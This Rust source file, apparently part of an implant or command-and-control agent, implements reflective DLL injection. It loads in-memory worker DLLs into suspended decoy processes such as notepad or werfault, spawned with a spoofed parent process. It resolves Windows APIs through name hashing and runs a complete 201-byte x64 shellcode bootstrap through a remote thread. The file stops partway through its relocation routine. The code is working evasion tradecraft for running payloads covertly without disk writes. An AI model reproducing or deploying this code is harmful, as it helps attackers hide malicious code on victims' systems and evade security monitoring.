//! Reflective DLL injection — load worker modules into sacrificial processes without disk writes.
//!
 //! `inject` / `ad` workers are DLL PE bytes held only in Stage0 memory and mapped
//! into a short-lived host process (notepad / werfault / …). Parent ↔ child I/O uses
//! dedicated job/result pipes whose child ends are duplicated into the host (no stdio).
//!
//! Pipeline:
//! 1. Spawn host suspended (main thread never runs, so host stdio/exit behavior
//!    is irrelevant — even Win11 app-stub exes work as silent decoys)
//! 2. Parse PE → allocate SizeOfImage in host (VirtualAllocEx)
//! 3. Write headers + sections → apply base relocations
//! 4. Allocate the module TLS template block in the child
//! 5. Resolve export `x1` (fallback: AddressOfEntryPoint)
//! 6. Write child-side bootstrap (149-byte shellcode + setup page): imports are
//!    resolved **inside the child** via LoadLibraryA/GetProcAddress (kernel32
//!    addresses are valid across processes; agent-side CRT DLL addresses are
//!    not), then `_tls_index` is set to slot 63 and TEB TLS array slot 63 is
//!    pointed at the TLS block so thread_local accessors work, then worker x1
//!    is called with the WorkerIo param page
//! 7. CreateRemoteThread / NtCreateThreadEx at the shellcode with setup page param
//! 8. Parent writes job frame on pipe → reads framed result → terminates host

use crate::native;
use crate::stealth;
use log::{info, warn};
use std::ptr;

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const IMAGE_REL_BASED_DIR64: u16 = 10;
const IMAGE_REL_BASED_HIGHLOW: u16 = 3;
const IMAGE_REL_BASED_ABSOLUTE: u16 = 0;

/// x64 child-side bootstrap shellcode (201 bytes), executed as the remote thread.
/// Entry: rcx = setup page VA. Setup page layout (all u64 LE):
///   +0x00 loadlib (LoadLibraryA addr), +0x08 getproc (GetProcAddress addr),
///   +0x10 rtl_alloc (RtlAllocateHeap addr), +0x18 count,
///   +0x20 entries[count] × 32B {dll_ptr, func_ptr, ord(u16, 0 = by name),
///     iat_va}, then 40B TLS section {tls_index_addr, tls_index(=63),
///     tls_block_va, worker_entry, worker_param}, then NUL-terminated strings.
///
/// Only non-volatile regs (rbx/rdi/rsi/r12-r15) hold state across calls.
///
/// Disassembly (offsets decimal):
///   0  55                  push rbp
///   1  48 89 E5            mov rbp,rsp
///   4  48 83 EC 40         sub rsp,0x40
///   8  4C 8B 21            mov r12,[rcx]          ; loadlib
///   11 4C 8B 69 08         mov r13,[rcx+8]        ; getproc
///   15 4C 8B 71 10         mov r14,[rcx+0x10]     ; rtl_alloc
///   19 48 8B 59 18         mov rbx,[rcx+0x18]     ; count
///   23 48 8D 79 20         lea rdi,[rcx+0x20]     ; entries (inline array)
///   27 48 31 F6            xor rsi,rsi            ; i = 0
///   30 49 89 FF            mov r15,rdi            ; entry ptr
///   33 48 39 F3            cmp rbx,rsi
///   36 76 3A               jbe +0x3A (→96)
///   38 49 8B 0F            mov rcx,[r15]          ; dll_ptr
///   41 49 8B 57 08         mov rdx,[r15+8]        ; func_ptr
///   45 41 FF D4            call r12               ; LoadLibraryA
///   48 48 85 C0            test rax,rax
///   51 74 8D               jz +0x8D (→194 fail)
///   53 48 89 C1            mov rcx,rax
///   56 49 8B 57 08         mov rdx,[r15+8]
///   60 4D 8B 47 10         mov r8,[r15+0x10]      ; ord
///   64 4D 85 C0            test r8,r8
///   67 74 03               jz +3 (→72, skip mov rdx,r8)
///   69 4C 89 C2            mov rdx,r8             ; ordinal as LPCSTR
///   72 41 FF D5            call r13               ; GetProcAddress
///   75 48 85 C0            test rax,rax
///   78 74 72               jz +0x72 (→194 fail)
///   80 49 8B 57 18         mov rdx,[r15+0x18]     ; iat_va
///   84 48 89 02            mov [rdx],rax          ; *iat_va = fn
///   87 48 FF C6            inc rsi
///   90 49 83 C7 20         add r15,0x20
///   94 EB C1               jmp -0x3F (→33)
///   96 49 8B 07            mov rax,[r15]          ; tls_index_addr
///   99 48 85 C0            test rax,rax
///   102 74 4E              jz +0x4E (→182 no_tls)
///   104 49 8B 57 08        mov rdx,[r15+8]        ; index
///   108 89 10              mov [rax],edx          ; *_tls_index = 63
///   110 65 48 8B 04 25 58 00 00 00  mov rax,gs:[0x58]  ; TEB TLS array
///   119 48 85 C0           test rax,rax
///   122 75 22              jnz +0x22 (→158 have_array)
///   124 65 48 8B 0C 25 60 00 00 00  mov rcx,gs:[0x60]  ; PEB->ProcessHeap
///   133 31 D2              xor edx,edx            ; flags = 0
///   135 41 B8 00 02 00 00  mov r8d,0x200          ; 64 × 8
///   141 41 FF D6           call r14               ; RtlAllocateHeap
///   144 48 85 C0           test rax,rax
///   147 74 2D              jz +0x2D (→194 fail)
///   149 65 48 89 04 25 58 00 00 00  mov [gs:0x58],rax  ; TEB->TLS ptr = array
///   158 49 8B 57 08        have_array: mov rdx,[r15+8]
///   162 49 8B 5F 10        mov rbx,[r15+0x10]     ; block_va
///   166 48 89 1C D0        mov [rax+rdx*8],rbx    ; TlsPtr[63] = block
///   170 49 8B 47 18        mov rax,[r15+0x18]     ; worker_entry
///   174 49 8B 4F 20        mov rcx,[r15+0x20]     ; worker_param
///   178 FF D0              call rax
///   180 C9 C3              leave; ret
///   182 49 8B 47 18        no_tls: mov rax,[r15+0x18]
///   186 49 8B 4F 20        mov rcx,[r15+0x20]
///   190 FF D0              call rax
///   192 C9 C3              leave; ret
///   194 B8 AD DE 00 00     fail: mov eax,0xDEAD
///   199 C9 C3              leave; ret
const BOOTSTRAP_SC: [u8; 201] = [
    0x55, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x40, // 0-7
    0x4C, 0x8B, 0x21, // 8-10
    0x4C, 0x8B, 0x69, 0x08, // 11-14
    0x4C, 0x8B, 0x71, 0x10, // 15-18
    0x48, 0x8B, 0x59, 0x18, // 19-22
    0x48, 0x8D, 0x79, 0x20, // 23-26 lea rdi,[rcx+0x20] (entries inline)
    0x48, 0x31, 0xF6, // 27-29
    0x49, 0x89, 0xFF, // 30-32
    0x48, 0x39, 0xF3, // 33-35
    0x76, 0x3A, // 36-37 jbe +0x3A
    0x49, 0x8B, 0x0F, // 38-40
    0x49, 0x8B, 0x57, 0x08, // 41-44
    0x41, 0xFF, 0xD4, // 45-47 call r12
    0x48, 0x85, 0xC0, // 48-50
    0x74, 0x8D, // 51-52 jz +0x8D
    0x48, 0x89, 0xC1, // 53-55
    0x49, 0x8B, 0x57, 0x08, // 56-59
    0x4D, 0x8B, 0x47, 0x10, // 60-63 mov r8,[r15+0x10]
    0x4D, 0x85, 0xC0, // 64-66 test r8,r8
    0x74, 0x03, // 67-68 jz +3 (→72, skip 3-byte mov rdx,r8)
    0x4C, 0x89, 0xC2, // 69-71 mov rdx,r8
    0x41, 0xFF, 0xD5, // 72-74 call r13
    0x48, 0x85, 0xC0, // 75-77
    0x74, 0x72, // 78-79 jz +0x72
    0x49, 0x8B, 0x57, 0x18, // 80-83
    0x48, 0x89, 0x02, // 84-86 mov [rdx],rax
    0x48, 0xFF, 0xC6, // 87-89 inc rsi
    0x49, 0x83, 0xC7, 0x20, // 90-93 add r15,0x20
    0xEB, 0xC1, // 94-95 jmp -0x3F
    0x49, 0x8B, 0x07, // 96-98
    0x48, 0x85, 0xC0, // 99-101
    0x74, 0x4E, // 102-103 jz +0x4E
    0x49, 0x8B, 0x57, 0x08, // 104-107
    0x89, 0x10, // 108-109 mov [rax],edx
    0x65, 0x48, 0x8B, 0x04, 0x25, 0x58, 0x00, 0x00, 0x00, // 110-118 gs:[0x58]
    0x48, 0x85, 0xC0, // 119-121
    0x75, 0x22, // 122-123 jnz +0x22
    0x65, 0x48, 0x8B, 0x0C, 0x25, 0x60, 0x00, 0x00, 0x00, // 124-132 gs:[0x60]
    0x31, 0xD2, // 133-134 xor edx,edx
    0x41, 0xB8, 0x00, 0x02, 0x00, 0x00, // 135-140 mov r8d,0x200
    0x41, 0xFF, 0xD6, // 141-143 call r14
    0x48, 0x85, 0xC0, // 144-146
    0x74, 0x2D, // 147-148 jz +0x2D
    0x65, 0x48, 0x89, 0x04, 0x25, 0x58, 0x00, 0x00, 0x00, // 149-157 [gs:0x58],rax
    0x49, 0x8B, 0x57, 0x08, // 158-161
    0x49, 0x8B, 0x5F, 0x10, // 162-165
    0x48, 0x89, 0x1C, 0xD0, // 166-169 mov [rax+rdx*8],rbx
    0x49, 0x8B, 0x47, 0x18, // 170-173
    0x49, 0x8B, 0x4F, 0x20, // 174-177
    0xFF, 0xD0, // 178-179 call rax
    0xC9, 0xC3, // 180-181 leave; ret
    0x49, 0x8B, 0x47, 0x18, // 182-185
    0x49, 0x8B, 0x4F, 0x20, // 186-189
    0xFF, 0xD0, // 190-191 call rax
    0xC9, 0xC3, // 192-193 leave; ret
    0xB8, 0xAD, 0xDE, 0x00, 0x00, // 194-198 mov eax,0xDEAD
    0xC9, 0xC3, // 199-200 leave; ret
];

/// Parsed PE layout needed for remote map.
struct PeLayout {
    image_base: u64,
    size_of_image: usize,
    size_of_headers: usize,
    entry_rva: u32,
    export_rva: u32,
    export_size: u32,
    import_rva: u32,
    tls_rva: u32,
    tls_size: u32,
    reloc_rva: u32,
    reloc_size: u32,
    is_x64: bool,
    /// (va, raw_ptr, raw_size, virt_size)
    sections: Vec<(u32, u32, u32, u32)>,
}

/// Spawn sacrificial process + reflectively load DLL worker module.
///
/// `cmdline` is the full child command line (callers quote the host path).
/// The host is spawned *suspended* (main thread never runs) with dedicated
/// job/result pipes, so host stdio behavior cannot corrupt the framed protocol.
/// Returns raw output bytes from the worker (caller parses protocol framing).
pub fn spawn_reflective_worker(
    dll_bytes: &[u8],
    json_body: &[u8],
    deadline_ms: u64,
    cmdline: &str,
) -> Result<(Vec<u8>, Vec<u8>), String> {
    if dll_bytes.len() < 64 || dll_bytes[0] != b'M' || dll_bytes[1] != b'Z' {
        return Err("invalid image format".into());
    }

    let parent_for_spoof = crate::isolated_exec::pick_parent_for_supervisor();

    // Dedicated pipes: job frame agent→worker, result frame worker→agent.
    let (job_r, job_w) = native::spawn::create_pipe_pair()
        .map_err(|e| format!("create job pipe: {e}"))?;
    let (result_r, result_w) = native::spawn::create_pipe_pair()
        .map_err(|e| format!("create result pipe: {e}"))?;

    let child = native::spawn::spawn_suspended_decoy(cmdline, parent_for_spoof)
        .map_err(|e| format!("spawn sacrificial process: {e}"))?;

    // Duplicate the worker ends into the child (child-relative values).
    let child_job_r = native::spawn::duplicate_into_process(child.h_process, job_r)
        .map_err(|e| format!("dup job pipe into child: {e}"))?;
    let child_result_w = native::spawn::duplicate_into_process(child.h_process, result_w)
        .map_err(|e| format!("dup result pipe into child: {e}"))?;
    // Agent no longer needs the child ends.
    let _ = native::close_handle(job_r);
    let _ = native::close_handle(result_w);

    #[cfg(debug_assertions)]
    info!(
        "[worker] spawned suspended decoy pid={} cmdline={}",
        child.pid, cmdline
    );

    let result = inject_and_execute_dll(
        child.h_process,
        dll_bytes,
        json_body,
        job_w,
        result_r,
        child_job_r,
        child_result_w,
        deadline_ms,
    );
    let result = match result {
        Ok(pair) => Ok(pair),
        Err(e) => {
            let exited = native::spawn::process_has_exited(child.h_process);
            let code = native::spawn::process_exit_code(child.h_process);
            Err(format!("{e} (child exited={:?} code={:?})", exited, code))
        }
    };

    let _ = native::terminate_process_handle(child.h_process);
    let _ = native::close_handle(job_w);
    let _ = native::close_handle(result_r);
    let _ = native::close_handle(child.h_process);

    result
}

#[cfg(windows)]
fn inject_and_execute_dll(
    h_process: usize,
    dll_bytes: &[u8],
    json_body: &[u8],
    job_write: usize,
    result_read: usize,
    child_job_read: usize,
    child_result_write: usize,
    deadline_ms: u64,
) -> Result<(Vec<u8>, Vec<u8>), String> {
    let layout = parse_pe_layout(dll_bytes)?;
    #[cfg(debug_assertions)]
    info!(
        "[worker] PE: preferred_base=0x{:x} size=0x{:x} entry_rva=0x{:x} sections={}",
        layout.image_base,
        layout.size_of_image,
        layout.entry_rva,
        layout.sections.len()
    );

    // Start result-pipe reader early so we don't miss worker output.
    let max_out = 2 * 1024 * 1024;
    let reader = std::thread::spawn(move || -> Result<(Vec<u8>, Vec<u8>), String> {
        let hdr = native::pipe_read_exact(result_read, 8)?;
        let out_len = u32::from_le_bytes([hdr[0], hdr[1], hdr[2], hdr[3]]) as usize;
        let err_len = u32::from_le_bytes([hdr[4], hdr[5], hdr[6], hdr[7]]) as usize;
        if out_len > max_out || err_len > max_out {
            return Err(format!(
                "worker output too large out_len={out_len} err_len={err_len} hdr={hdr:02x?}"
            ));
        }
        let out = native::pipe_read_exact(result_read, out_len)?;
        let err = native::pipe_read_exact(result_read, err_len)?;
        let _ = native::close_handle(result_read);
        Ok((out, err))
    });

    let alloc_base = unsafe { remote_alloc(h_process, layout.size_of_image)? };
    #[cfg(debug_assertions)]
    info!("[worker] remote image base=0x{:x}", alloc_base);

    unsafe {
        map_image_remote(h_process, dll_bytes, &layout, alloc_base)?;
        apply_relocations_remote(h_process, dll_bytes, &layout, alloc_base)?;
        // NOTE: Image stays RW (not RX) here because the child-side bootstrap
        // shellcode resolves imports by writing to the IAT (iat_va) inside the
        // image. Flipping to RX before bootstrap completes would AV.
        // Memory is RW (not RWX) — already better than the original RWX window.
    }

    // TLS emulation: allocate the module's TLS template in the child. Actual
    // registration (_tls_index write + TEB TLS array slot) happens on the
    // worker thread via the bootstrap (per-thread state).
    let (tls_block, tls_index_addr) =
        unsafe { setup_remote_tls(h_process, dll_bytes, &layout, alloc_base)? };

    let worker_rva = resolve_export_rva(dll_bytes, &layout, b"x1").unwrap_or(0);
    if worker_rva == 0 && layout.entry_rva == 0 {
        let _ = unsafe { remote_free(h_process, alloc_base) };
        if tls_block != 0 {
            let _ = unsafe { remote_free(h_process, tls_block) };
        }
        return Err("worker: no entry / x1 export".into());
    }
    // Prefer x1 worker export as thread entry.
    // Calling PE AddressOfEntryPoint (CRT DllMain) via a trampoline is fragile for
    // Rust cdylibs under manual-map; x1 is designed as LPTHREAD_START_ROUTINE and
    // performs the full worker job without relying on CRT DllMain side-effects.
    let worker_addr = if worker_rva != 0 {
        alloc_base + worker_rva as usize
    } else if layout.entry_rva != 0 {
        alloc_base + layout.entry_rva as usize
    } else {
        let _ = unsafe { remote_free(h_process, alloc_base) };
        if tls_block != 0 {
            let _ = unsafe { remote_free(h_process, tls_block) };
        }
        return Err("worker: no usable entry".into());
    };

    // Worker I/O param page: job/result pipe handles (child-relative values).
    // The worker thread reads this WorkerIo from its thread param.
    let io = crate::worker_io::WorkerIo {
        job_read: child_job_read as u64,
        result_write: child_result_write as u64,
    };
    let param_va = match unsafe { remote_alloc(h_process, 0x1000) } {
        Ok(p) => p,
        Err(e) => {
            let _ = unsafe { remote_free(h_process, alloc_base) };
            if tls_block != 0 {
                let _ = unsafe { remote_free(h_process, tls_block) };
            }
            return Err(e);
        }
    };
    if let Err(e) = unsafe { remote_write(h_process, param_va, &io.to_bytes()) } {
        let _ = unsafe { remote_free(h_process, param_va) };
        if tls_block != 0 {
            let _ = unsafe { remote_free(h_process, tls_block) };
        }
        return Err(e);
    }

    // Child-side bootstrap: imports are resolved inside the child
    // (LoadLibraryA/GetProcAddress — kernel32 is same-base across processes;
    // agent-side CRT DLL addresses would AV), TLS is registered for the worker
    // thread, then x1 is called. Thread starts at the shellcode page.
    let k32 = unsafe { stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll")) };
    let loadlib = if k32 != 0 {
        unsafe { stealth::get_api_addr(k32, stealth::hash_api_name(b"LoadLibraryA")) }
    } else {
        None
    };
    let getproc = if k32 != 0 {
        unsafe { stealth::get_api_addr(k32, stealth::hash_api_name(b"GetProcAddress")) }
    } else {
        None
    };
    // RtlAllocateHeap: the bootstrap may need to allocate the TEB TLS array
    // (TEB->ThreadLocalStoragePointer is NULL in a suspended decoy).
    let ntdll = unsafe { stealth::get_module_base(stealth::hash_module_name(b"ntdll.dll")) };
    let rtl_alloc = if ntdll != 0 {
        unsafe { stealth::get_api_addr(ntdll, stealth::hash_api_name(b"RtlAllocateHeap")) }
    } else {
        None
    };
    let (loadlib, getproc, rtl_alloc) = match (loadlib, getproc, rtl_alloc) {
        (Some(a), Some(b), Some(c)) => (a, b, c),
        _ => {
            let _ = unsafe { remote_free(h_process, param_va) };
            if tls_block != 0 {
                let _ = unsafe { remote_free(h_process, tls_block) };
            }
            return Err(
                "kernel32/ntdll LoadLibraryA/GetProcAddress/RtlAllocateHeap unresolved".into(),
            );
        }
    };
    let plan = match build_import_plan(dll_bytes, &layout, alloc_base) {
        Ok(p) => p,
        Err(e) => {
            let _ = unsafe { remote_free(h_process, param_va) };
            if tls_block != 0 {
                let _ = unsafe { remote_free(h_process, tls_block) };
            }
            return Err(e);
        }
    };
    let (sc_va, setup_va) = match unsafe {
        write_bootstrap_setup(
            h_process,
            &plan,
            loadlib,
            getproc,
            rtl_alloc,
            tls_index_addr,
            tls_block,
            worker_addr,
            param_va,
        )
    } {
        Ok(pair) => pair,
        Err(e) => {
            let _ = unsafe { remote_free(h_process, param_va) };
            if tls_block != 0 {
                let _ = unsafe { remote_free(h_process, tls_block) };
            }
            return Err(e);
        }
    };

    let h_thread = match unsafe {
        remote_create_thread_with_param(h_process, sc_va, setup_va)
    } {
        Ok(h) => h,
        Err(e) => {
            let _ = unsafe { remote_free(h_process, param_va) };
            let _ = unsafe { remote_free(h_process, sc_va) };
            let _ = unsafe { remote_free(h_process, setup_va) };
            if tls_block != 0 {
                let _ = unsafe { remote_free(h_process, tls_block) };
            }
            return Err(e);
        }
    };
    #[cfg(debug_assertions)]
    info!(
        "[worker] remote worker thread sc=0x{:x} setup=0x{:x} x1=0x{:x} handle=0x{:x}",
        sc_va, setup_va, worker_addr, h_thread
    );

    // Feed job frame after the worker thread is running (it blocks on the job pipe).
    if let Err(e) = native::pipe_write_all(job_write, json_body) {
        let _ = native::close_handle(h_thread);
        let _ = unsafe { remote_free(h_process, alloc_base) };
        let _ = unsafe { remote_free(h_process, param_va) };
        let _ = unsafe { remote_free(h_process, sc_va) };
        let _ = unsafe { remote_free(h_process, setup_va) };
        if tls_block != 0 {
            let _ = unsafe { remote_free(h_process, tls_block) };
        }
        return Err(format!("write pipe: {e}"));
    }
    let _ = native::close_handle(job_write);

    let wait_ms = deadline_ms.clamp(1_000, 300_000) as u32;
    let _ = native::wait_for_single_object_timeout(h_thread, wait_ms);
    let _ = native::close_handle(h_thread);
    let _ = unsafe { remote_free(h_process, param_va) };
    let _ = unsafe { remote_free(h_process, sc_va) };
    let _ = unsafe { remote_free(h_process, setup_va) };
    if tls_block != 0 {
        let _ = unsafe { remote_free(h_process, tls_block) };
    }

    match reader.join() {
        Ok(Ok(pair)) => Ok(pair),
        Ok(Err(e)) => Err(e),
        Err(_) => Err("worker reader panicked".into()),
    }
}

#[cfg(not(windows))]
fn inject_and_execute_dll(
    _h_process: usize,
    _dll_bytes: &[u8],
    _json_body: &[u8],
    _job_write: usize,
    _result_read: usize,
    _child_job_read: usize,
    _child_result_write: usize,
    _deadline_ms: u64,
) -> Result<(Vec<u8>, Vec<u8>), String> {
    Err("worker: windows only".into())
}

fn parse_pe_layout(pe: &[u8]) -> Result<PeLayout, String> {
    if pe.len() < 0x40 {
        return Err("PE too short".into());
    }
    let e_lfanew = u32::from_le_bytes(pe[0x3C..0x40].try_into().unwrap()) as usize;
    if e_lfanew + 0x18 > pe.len() {
        return Err("invalid e_lfanew".into());
    }
    if &pe[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
        return Err("invalid PE signature in worker".into());
    }
    let machine = u16::from_le_bytes(pe[e_lfanew + 4..e_lfanew + 6].try_into().unwrap());
    let is_x64 = machine == 0x8664;
    let num_sections = u16::from_le_bytes(pe[e_lfanew + 6..e_lfanew + 8].try_into().unwrap()) as usize;
    let opt_hdr_size =
        u16::from_le_bytes(pe[e_lfanew + 20..e_lfanew + 22].try_into().unwrap()) as usize;
    let opt = e_lfanew + 24;
    if opt + opt_hdr_size > pe.len() {
        return Err("truncated optional header".into());
    }
    let magic = u16::from_le_bytes(pe[opt..opt + 2].try_into().unwrap());
    let (size_of_image, size_of_headers, image_base, entry_rva, dd_base) = if magic == 0x20B {
        (
            u32::from_le_bytes(pe[opt + 56..opt + 60].try_into().unwrap()) as usize,
            u32::from_le_bytes(pe[opt + 60..opt + 64].try_into().unwrap()) as usize,
            u64::from_le_bytes(pe[opt + 24..opt + 32].try_into().unwrap()),
            u32::from_le_bytes(pe[opt + 16..opt + 20].try_into().unwrap()),
            opt + 112,
        )
    } else if magic == 0x10B {
        (
            u32::from_le_bytes(pe[opt + 56..opt + 60].try_into().unwrap()) as usize,
            u32::from_le_bytes(pe[opt + 60..opt + 64].try_into().unwrap()) as usize,
            u32::from_le_bytes(pe[opt + 28..opt + 32].try_into().unwrap()) as u64,
            u32::from_le_bytes(pe[opt + 16..opt + 20].try_into().unwrap()),
            opt + 96,
        )
    } else {
        return Err(format!("unknown optional magic 0x{magic:x}"));
    };
    if size_of_image == 0 || size_of_image > 256 * 1024 * 1024 {
        return Err(format!("absurd SizeOfImage {size_of_image}"));
    }
    if size_of_headers > pe.len() || size_of_headers > size_of_image {
        return Err("bad SizeOfHeaders".into());
    }

    let export_rva = dir_u32(pe, dd_base, 0);
    let export_size = dir_size(pe, dd_base, 0);
    let import_rva = dir_u32(pe, dd_base, 1);
    let tls_rva = dir_u32(pe, dd_base, 9);
    let tls_size = dir_size(pe, dd_base, 9);
    let reloc_rva = dir_u32(pe, dd_base, 5);
    let reloc_size = dir_size(pe, dd_base, 5);

    let section_table = opt + opt_hdr_size;
    let mut sections = Vec::with_capacity(num_sections);
    for i in 0..num_sections {
        let sh = section_table + i * 40;
        if sh + 40 > pe.len() {
            break;
        }
        let virt_size = u32::from_le_bytes(pe[sh + 8..sh + 12].try_into().unwrap());
        let va = u32::from_le_bytes(pe[sh + 12..sh + 16].try_into().unwrap());
        let raw_size = u32::from_le_bytes(pe[sh + 16..sh + 20].try_into().unwrap());
        let raw_ptr = u32::from_le_bytes(pe[sh + 20..sh + 24].try_into().unwrap());
        sections.push((va, raw_ptr, raw_size, virt_size));
    }

    Ok(PeLayout {
        image_base,
        size_of_image,
        size_of_headers,
        entry_rva,
        export_rva,
        export_size,
        import_rva,
        tls_rva,
        tls_size,
        reloc_rva,
        reloc_size,
        is_x64,
        sections,
    })
}

fn dir_u32(pe: &[u8], dd_base: usize, index: usize) -> u32 {
    let off = dd_base + index * 8;
    if off + 4 > pe.len() {
        return 0;
    }
    u32::from_le_bytes(pe[off..off + 4].try_into().unwrap())
}

fn dir_size(pe: &[u8], dd_base: usize, index: usize) -> u32 {
    let off = dd_base + index * 8 + 4;
    if off + 4 > pe.len() {
        return 0;
    }
    u32::from_le_bytes(pe[off..off + 4].try_into().unwrap())
}

/// Convert an RVA into a file offset using the section table (headers fallback).
fn rva_to_off(pe: &[u8], layout: &PeLayout, rva: u32) -> Option<usize> {
    for &(va, raw_ptr, raw_size, _vs) in &layout.sections {
        if rva >= va && (rva as u64) < (va as u64 + raw_size.max(1) as u64) {
            return Some((raw_ptr + (rva - va)) as usize);
        }
    }
    if (rva as usize) < layout.size_of_headers && (rva as usize) < pe.len() {
        return Some(rva as usize);
    }
    None
}

/// Allocate the module TLS template + zero-fill in the child process.
///
/// Returns `(block_va, tls_index_addr)` — the remote TLS block base and the
/// child address of `_tls_index` (0, 0 = module has no usable TLS directory).
/// Registration (_tls_index write + TEB TLS array slot) is done per-thread by
/// the bootstrap shellcode, not here.
///
/// TLS directory layout differs by linker: MSVC/lld-link emit IMAGE_TLS_DIRECTORY64
/// with DWORD `AddressOfIndex`/`AddressOfCallBacks` at +0x10/+0x14; binutils
/// (GNU ld) emits the same fields as full QWORD VAs at +0x10/+0x18 (40-byte dir).
/// We detect the variant by whether the QWORD at +0x10 parses as an in-image VA.
#[cfg(windows)]
unsafe fn setup_remote_tls(
    h_process: usize,
    pe: &[u8],
    layout: &PeLayout,
    alloc_base: usize,
) -> Result<(usize, usize), String> {
    if layout.tls_rva == 0 {
        return Ok((0, 0));
    }
    let dir_off = rva_to_off(pe, layout, layout.tls_rva).ok_or("TLS directory OOB")?;
    // IMAGE_TLS_DIRECTORY: PE32 = 24 bytes, PE32+ = 32 (MSVC/lld) or 40 (GNU).
    let min_len = if layout.is_x64 { 32 } else { 24 };
    if layout.tls_size < min_len as u32 || dir_off + min_len > pe.len() {
        return Ok((0, 0));
    }
    let (start_va, end_va) = if layout.is_x64 {
        (
            u64::from_le_bytes(pe[dir_off..dir_off + 8].try_into().unwrap()),
            u64::from_le_bytes(pe[dir_off + 8..dir_off + 16].try_into().unwrap()),
        )
    } else {
        (
            u32::from_le_bytes(pe[dir_off..dir_off + 4].try_into().unwrap()) as u64,
            u32::from_le_bytes(pe[dir_off + 4..dir_off + 8].try_into().unwrap()) as u64,
        )
    };
    let img_lo = layout.image_base;
    let img_hi = layout.image_base + layout.size_of_image as u64;
    let in_image = |va: u64| va >= img_lo && va < img_hi;

    // AddressOfIndex + SizeOfZeroFill, autodetecting the linker layout.
    let (index_va, zero_fill) = if layout.is_x64 {
        let q = u64::from_le_bytes(pe[dir_off + 16..dir_off + 24].try_into().unwrap());
        if in_image(q) && dir_off + 40 <= pe.len() {
            // binutils-style: QWORD AddressOfIndex at +0x10, SizeOfZeroFill at +0x20.
            (
                q,
                u32::from_le_bytes(pe[dir_off + 32..dir_off + 36].try_into().unwrap()) as usize,
            )
        } else {
            let d = u32::from_le_bytes(pe[dir_off + 16..dir_off + 20].try_into().unwrap()) as u64;
            if in_image(d) {
                // MSVC/lld-style: DWORD AddressOfIndex at +0x10, SizeOfZeroFill at +0x18.
                (
                    d,
                    u32::from_le_bytes(pe[dir_off + 24..dir_off + 28].try_into().unwrap()) as usize,
                )
            } else {
                (0, 0)
            }
        }
    } else {
        let d = u32::from_le_bytes(pe[dir_off + 8..dir_off + 12].try_into().unwrap()) as u64;
        if in_image(d) {
            (
                d,
                u32::from_le_bytes(pe[dir_off + 16..dir_off + 20].try_into().unwrap()) as usize,
            )
        } else {
            (0, 0)
        }
    };

    // _tls_index lives in the mapped image; compute its child address.
    let tls_index_addr = if index_va >= layout.image_base {
        alloc_base + (index_va - layout.image_base) as usize
    } else {
        0
    };

    let mut block: Vec<u8> = Vec::new();
    if end_va > start_va {
        let start_rva = start_va
            .checked_sub(layout.image_base)
            .ok_or("TLS start VA below image base")?;
        let end_rva = end_va
            .checked_sub(layout.image_base)
            .ok_or("TLS end VA below image base")?;
        if end_rva > start_rva && (end_rva as usize) <= layout.size_of_image {
            let tlen = (end_rva - start_rva) as usize;
            if let Some(off) = rva_to_off(pe, layout, start_rva as u32) {
                let copy = tlen.min(pe.len().saturating_sub(off));
                block.extend_from_slice(&pe[off..off + copy]);
                block.resize(tlen, 0);
            } else {
                block.resize(tlen, 0);
            }
        }
    }
    // SizeOfZeroFill must stay sane (cap 1 MiB) to avoid absurd allocations.
    block.resize(block.len() + zero_fill.min(1 << 20), 0);
    if block.len() > 4 * 1024 * 1024 {
        return Err("TLS block too large".into());
    }
    // Without a valid `_tls_index` address the bootstrap cannot register the
    // block — treat the module as TLS-less (stubs would read stale data).
    if block.is_empty() || tls_index_addr == 0 {
        return Ok((0, 0));
    }

    let block_va = remote_alloc(h_process, block.len().max(0x1000))?;
    remote_write(h_process, block_va, &block)?;
    #[cfg(debug_assertions)]
    info!(
        "[worker] TLS block 0x{:x} len={} zerofill={} tls_index=0x{:x}",
        block_va, block.len(), zero_fill, tls_index_addr
    );
    Ok((block_va, tls_index_addr))
}

/// Build mapped image bytes locally (headers + sections), then write once to remote.
#[cfg(windows)]
unsafe fn map_image_remote(
    h_process: usize,
    pe: &[u8],
    layout: &PeLayout,
    alloc_base: usize,
) -> Result<(), String> {
    let mut image = vec![0u8; layout.size_of_image];
    let hdr_len = layout.size_of_headers.min(pe.len()).min(layout.size_of_image);
    image[..hdr_len].copy_from_slice(&pe[..hdr_len]);

    for &(va, raw_ptr, raw_size, virt_size) in &layout.sections {
        if raw_ptr == 0 || raw_size == 0 {
            continue;
        }
        let raw_ptr = raw_ptr as usize;
        let raw_size = raw_size as usize;
        let va = va as usize;
        if raw_ptr + raw_size > pe.len() || va >= layout.size_of_image {
            continue;
        }
        let copy_len = raw_size
            .min(virt_size as usize)
            .min(layout.size_of_image - va)
            .min(pe.len() - raw_ptr);
        image[va..va + copy_len].copy_from_slice(&pe[raw_ptr..raw_ptr + copy_len]);
    }

    remote_write(h_process, alloc_base, &image)
}

#[cfg(windows)]
unsafe fn apply_relocations_remote(
    h_process: usize,
    pe: &[u8],
    layout: &PeLayout,
    alloc_base: usize,
) -> Result<(), String> {
    let delta = (alloc_base as i64).wrapping_sub(layout.image_base as i64);
    if delta == 0 || layout.reloc_rva == 0 || layout.reloc_size == 0 {
        return Ok(());
    }

    // Rebuild local mapped view for reloc application, then patch remote pages.
    let mut image = vec![0u8; layout.size_of_image];
    let hdr_len = layout.size_of_headers.min(pe.len()).min(layout.size_of_image);
    image[..hdr_len].copy_from_slice(&pe[..hdr_len]);
    for &(va, raw_ptr, raw_size, virt_size) in &layout.sections {
        if raw_ptr == 0 || raw_size == 0 {
            continue;
        }
        let raw_ptr = raw_ptr as usize;
        let raw_size = raw_size as usize;
        let va = va as usize;
        if raw_ptr + raw_size > pe.len() || va >= layout.size_of_image {
            continue;
        }
        let copy_len = raw_size
            .min(virt_size as usize)
            .min(layout.size_of_image - va)
            .min(pe.len() - raw_ptr);
        image[va..va + copy_len].copy_from_slice(&pe[raw_ptr..raw_ptr + copy_len]);
    }

    let reloc_rva = layout.reloc_rva as usize;
    let reloc_size = layout.reloc_size as usize;
    if reloc_rva + reloc_size > image.len() {
        return Err("reloc directory OOB".into());
    }

    let mut off = 0usize;
